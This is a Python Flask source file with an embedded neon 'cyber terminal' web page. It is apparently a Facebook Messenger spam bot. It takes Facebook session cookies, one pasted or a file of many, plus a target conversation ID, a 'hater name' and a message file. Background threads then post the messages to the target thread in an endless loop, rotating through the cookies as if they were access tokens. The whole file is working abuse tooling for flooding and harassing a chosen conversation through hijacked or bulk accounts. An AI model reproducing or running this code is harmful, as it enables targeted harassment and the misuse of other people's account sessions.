from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import json
import re

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}

def extract_access_token_from_cookie(cookie_string):
    """Extract access token from Facebook cookie string"""
    try:
        # Parse cookie string to extract access token
        cookie_dict = {}
        for part in cookie_string.split(';'):
            if '=' in part:
                key, value = part.strip().split('=', 1)
                cookie_dict[key] = value
        
        # Try to get token from different possible cookie names
        possible_token_keys = ['access_token', 'xs', 'c_user']
        for key in possible_token_keys:
            if key in cookie_dict:
                return cookie_dict[key]
        
        # If no direct token, try to extract from string patterns
        token_pattern = r'[a-zA-Z0-9%]{50,}'
        matches = re.findall(token_pattern, cookie_string)
        if matches:
            return matches[0]
            
        return None
    except Exception as e:
        print(f"Error extracting token from cookie: {e}")
        return None

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for cookie_string in cookies_list:
                if stop_event.is_set():
                    break
                    
                # Extract access token from cookie
                access_token = extract_access_token_from_cookie(cookie_string)
                
                if not access_token:
                    print(f"Failed to extract access token from cookie")
                    continue
                
                # Prepare headers with cookie
                request_headers = headers.copy()
                request_headers['Cookie'] = cookie_string
                
                # Send message using Facebook Graph API
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                
                try:
                    response = requests.post(api_url, data=parameters, headers=request_headers)
                    if response.status_code == 200:
                        print(f"Message Sent Successfully From cookie: {message}")
                    else:
                        print(f"Message Sent Failed. Status: {response.status_code}, Response: {response.text}")
                except Exception as e:
                    print(f"Request failed: {e}")
                
                time.sleep(time_interval)

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('cookieOption')
        
        if cookie_option == 'single':
            cookies_list = [request.form.get('singleCookie')]
        else:
            cookie_file = request.files['cookieFile']
            cookies_list = cookie_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task started with ID: {task_id}'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AAHAN CONVO</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap');
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #000000;
      color: #00ff00;
      font-family: 'Orbitron', monospace;
      min-height: 100vh;
      overflow-x: hidden;
      background-image: 
        linear-gradient(45deg, #000000 0%, #001100 100%);
      position: relative;
    }
    
    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(0, 255, 0, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(0, 255, 255, 0.1) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(255, 0, 255, 0.1) 0%, transparent 50%);
      pointer-events: none;
      z-index: -1;
    }
    
    .scan-line {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(90deg, transparent, #00ff00, transparent);
      animation: scan 3s linear infinite;
      z-index: 999;
      pointer-events: none;
    }
    
    @keyframes scan {
      0% { top: 0%; }
      100% { top: 100%; }
    }
    
    .terminal-container {
      max-width: 600px;
      margin: 20px auto;
      padding: 20px;
      border: 1px solid #00ff00;
      box-shadow: 
        0 0 10px #00ff00,
        0 0 20px #00ff00,
        inset 0 0 10px #00ff00;
      background: rgba(0, 20, 0, 0.8);
      position: relative;
      overflow: hidden;
    }
    
    .terminal-container::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, #00ff00, #00ffff, #ff00ff, #00ff00);
      z-index: -1;
      animation: borderGlow 3s linear infinite;
    }
    
    @keyframes borderGlow {
      0% { filter: hue-rotate(0deg); }
      100% { filter: hue-rotate(360deg); }
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
      border-bottom: 1px solid #00ff00;
      position: relative;
    }
    
    .logo {
      font-size: 3rem;
      color: #00ff00;
      text-shadow: 0 0 10px #00ff00;
      margin-bottom: 10px;
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0%, 100% { text-shadow: 0 0 10px #00ff00; }
      50% { text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
    }
    
    .title {
      font-size: 2rem;
      font-weight: 900;
      background: linear-gradient(45deg, #00ff00, #00ffff, #ff00ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-transform: uppercase;
      letter-spacing: 3px;
    }
    
    .subtitle {
      color: #00ff00;
      font-size: 0.8rem;
      margin-top: 5px;
      opacity: 0.8;
    }
    
    .command-line {
      background: #001100;
      border: 1px solid #00ff00;
      padding: 20px;
      margin-bottom: 20px;
      position: relative;
    }
    
    .command-line::before {
      content: '>>>';
      position: absolute;
      left: 10px;
      top: 20px;
      color: #00ff00;
      font-weight: bold;
    }
    
    .form-group {
      margin-bottom: 25px;
      position: relative;
    }
    
    .form-label {
      color: #00ff00;
      font-weight: 500;
      margin-bottom: 10px;
      display: block;
      text-transform: uppercase;
      font-size: 0.9rem;
      letter-spacing: 1px;
    }
    
    .form-control {
      background: #000000;
      border: 1px solid #00ff00;
      border-radius: 0;
      color: #00ff00;
      padding: 12px 15px 12px 40px;
      width: 100%;
      font-family: 'Orbitron', monospace;
      transition: all 0.3s ease;
      box-shadow: inset 0 0 10px rgba(0, 255, 0, 0.2);
    }
    
    .form-control:focus {
      background: #001100;
      border-color: #00ffff;
      box-shadow: 
        inset 0 0 10px rgba(0, 255, 0, 0.5),
        0 0 10px rgba(0, 255, 255, 0.5);
      outline: none;
    }
    
    .form-control::placeholder {
      color: #008800;
    }
    
    .btn {
      padding: 15px 30px;
      border: 1px solid #00ff00;
      border-radius: 0;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s ease;
      width: 100%;
      margin-top: 10px;
      text-transform: uppercase;
      letter-spacing: 2px;
      font-family: 'Orbitron', monospace;
      position: relative;
      overflow: hidden;
    }
    
    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
      transition: 0.5s;
    }
    
    .btn:hover::before {
      left: 100%;
    }
    
    .btn-primary {
      background: #001100;
      color: #00ff00;
      box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
    }
    
    .btn-primary:hover {
      background: #00ff00;
      color: #000000;
      box-shadow: 0 0 20px #00ff00;
      transform: translateY(-2px);
    }
    
    .btn-danger {
      background: #001100;
      color: #ff0000;
      border-color: #ff0000;
      box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
    }
    
    .btn-danger:hover {
      background: #ff0000;
      color: #000000;
      box-shadow: 0 0 20px #ff0000;
      transform: translateY(-2px);
    }
    
    .file-upload {
      position: relative;
      overflow: hidden;
      display: inline-block;
      width: 100%;
    }
    
    .file-upload-btn {
      background: #001100;
      border: 2px dashed #00ff00;
      padding: 15px;
      text-align: center;
      cursor: pointer;
      transition: all 0.3s ease;
      width: 100%;
      color: #00ff00;
      font-family: 'Orbitron', monospace;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    .file-upload-btn:hover {
      background: #00ff00;
      color: #000000;
      box-shadow: 0 0 15px #00ff00;
    }
    
    .file-upload input {
      position: absolute;
      top: 0;
      right: 0;
      margin: 0;
      padding: 0;
      font-size: 20px;
      cursor: pointer;
      opacity: 0;
      height: 100%;
      width: 100%;
    }
    
    .status-box {
      background: #001100;
      border: 1px solid #00ff00;
      padding: 20px;
      margin: 20px 0;
      position: relative;
    }
    
    .status-title {
      color: #00ffff;
      font-weight: 700;
      margin-bottom: 15px;
      text-transform: uppercase;
      letter-spacing: 2px;
    }
    
    .footer {
      text-align: center;
      margin-top: 30px;
      padding: 20px;
      border-top: 1px solid #00ff00;
      color: #008800;
      font-size: 0.8rem;
    }
    
    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 15px;
    }
    
    .social-link {
      color: #00ff00;
      font-size: 1.5rem;
      transition: all 0.3s ease;
      text-decoration: none;
    }
    
    .social-link:hover {
      color: #00ffff;
      text-shadow: 0 0 10px #00ffff;
      transform: translateY(-3px);
    }
    
    .blink {
      animation: blink 1s infinite;
    }
    
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
    
    .matrix-bg {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: -2;
      opacity: 0.1;
    }
    
    .typewriter {
      overflow: hidden;
      border-right: 2px solid #00ff00;
      white-space: nowrap;
      margin: 0 auto;
      animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
    }
    
    @keyframes typing {
      from { width: 0 }
      to { width: 100% }
    }
    
    @keyframes blink-caret {
      from, to { border-color: transparent }
      50% { border-color: #00ff00 }
    }
  </style>
</head>
<body>
  <div class="scan-line"></div>
  <div class="matrix-bg"></div>
  
  <div class="terminal-container">
    <div class="header">
      <div class="logo">
        <i class="fas fa-terminal"></i>
      </div>
      <h1 class="title">AAHAN CONVO</h1>
      <p class="subtitle">CYBER MESSENGER TERMINAL</p>
      <div class="typewriter">SYSTEM READY FOR DEPLOYMENT</div>
    </div>
    
    <div class="command-line">
      <form method="post" enctype="multipart/form-data">
        <div class="form-group">
          <label class="form-label">COOKIE INPUT PROTOCOL</label>
          <select class="form-control" name="cookieOption" onchange="toggleCookieInput()" required>
            <option value="single">SINGLE COOKIE STRING</option>
            <option value="multiple">COOKIE FILE UPLOAD</option>
          </select>
        </div>
        
        <div class="form-group" id="singleCookieInput">
          <label class="form-label">COOKIE DATA</label>
          <textarea class="form-control" name="singleCookie" rows="3" placeholder="PASTE FACEBOOK COOKIE STRING..."></textarea>
        </div>
        
        <div class="form-group" id="cookieFileInput" style="display: none;">
          <label class="form-label">COOKIE FILE</label>
          <div class="file-upload">
            <div class="file-upload-btn">
              <i class="fas fa-file-code"></i> SELECT COOKIE FILE
            </div>
            <input type="file" name="cookieFile" accept=".txt">
          </div>
        </div>
        
        <div class="form-group">
          <label class="form-label">TARGET CONVERSATION ID</label>
          <input type="text" class="form-control" name="threadId" placeholder="ENTER CONVERSATION ID" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">HATER NAME</label>
          <input type="text" class="form-control" name="kidx" placeholder="ENTER HATER NAME" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">MESSAGE DELAY (SECONDS)</label>
          <input type="number" class="form-control" name="time" value="5" min="1" required>
        </div>
        
        <div class="form-group">
          <label class="form-label">MESSAGE PAYLOAD FILE</label>
          <div class="file-upload">
            <div class="file-upload-btn">
              <i class="fas fa-file-alt"></i> UPLOAD MESSAGE FILE
            </div>
            <input type="file" name="txtFile" accept=".txt" required>
          </div>
        </div>
        
        <button type="submit" class="btn btn-primary">
          <i class="fas fa-play blink"></i> INITIATE BOT DEPLOYMENT
        </button>
      </form>
    </div>
    
    <div class="status-box">
      <div class="status-title">SYSTEM CONTROL PANEL</div>
      <form method="post" action="/stop">
        <div class="form-group">
          <label class="form-label">TASK TERMINATION ID</label>
          <input type="text" class="form-control" name="taskId" placeholder="ENTER TASK ID FOR TERMINATION" required>
        </div>
        <button type="submit" class="btn btn-danger">
          <i class="fas fa-skull-crossbones"></i> TERMINATE TASK
        </button>
      </form>
    </div>
    
    <div class="footer">
      <div>SYSTEM VERSION 2.0.5 | ENCRYPTION: ACTIVE</div>
      <div>© 2025 DEVELOPED BY AAHAN</div>
      <div class="social-links">
        <a href="https://www.facebook.com/100064267823693" class="social-link" target="_blank">
          <i class="fab fa-facebook-f"></i>
        </a>
        <a href="https://wa.me/+917543864229" class="social-link" target="_blank">
          <i class="fab fa-whatsapp"></i>
        </a>
        <a href="#" class="social-link">
          <i class="fab fa-telegram-plane"></i>
        </a>
        <a href="#" class="social-link">
          <i class="fab fa-github"></i>
        </a>
      </div>
    </div>
  </div>

  <script>
    function toggleCookieInput() {
      const cookieOption = document.querySelector('select[name="cookieOption"]').value;
      if (cookieOption === 'single') {
        document.getElementById('singleCookieInput').style.display = 'block';
        document.getElementById('cookieFileInput').style.display = 'none';
      } else {
        document.getElementById('singleCookieInput').style.display = 'none';
        document.getElementById('cookieFileInput').style.display = 'block';
      }
    }
    
    // File input display
    document.querySelectorAll('.file-upload input').forEach(input => {
      input.addEventListener('change', function(e) {
        const fileName = e.target.files[0] ? e.target.files[0].name : 'NO FILE SELECTED';
        const btn = this.closest('.file-upload').querySelector('.file-upload-btn');
        btn.innerHTML = `<i class="fas fa-file"></i> ${fileName}`;
      });
    });
    
    // Matrix background effect
    function createMatrix() {
      const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
      const matrix = document.querySelector('.matrix-bg');
      
      for (let i = 0; i < 50; i++) {
        const span = document.createElement('span');
        span.style.position = 'fixed';
        span.style.top = Math.random() * 100 + 'vh';
        span.style.left = Math.random() * 100 + 'vw';
        span.style.color = '#00ff00';
        span.style.fontSize = (Math.random() * 10 + 10) + 'px';
        span.style.opacity = Math.random() * 0.5 + 0.1;
        span.textContent = chars[Math.floor(Math.random() * chars.length)];
        span.style.animation = `fall ${Math.random() * 5 + 3}s linear infinite`;
        matrix.appendChild(span);
      }
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
      toggleCookieInput();
      createMatrix();
    });
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
